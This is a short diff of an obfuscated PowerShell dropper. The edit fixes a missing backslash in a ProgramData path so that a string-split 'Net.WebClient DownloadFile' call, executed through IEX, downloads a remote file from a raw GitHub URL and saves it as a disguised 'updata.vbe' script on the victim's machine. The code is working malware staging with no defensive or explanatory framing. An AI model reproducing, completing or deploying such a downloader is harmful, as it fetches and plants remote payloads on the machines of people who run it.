@@ -1,4 +1,4 @@
-﻿$p = 'C:\ProgramData'
+﻿$p = 'C:\ProgramData\'
 
 $c1='(New-Object Net.We'; $c4='bClient).Downlo'; $c3='adFile(''https://raw.githubusercontent.com/wasawalid/getv/main/spamget/vbe.text'',$p+ ''updata.vbe'')';$TC=IEX ($c1,$c4,$c3 -Join '');
 
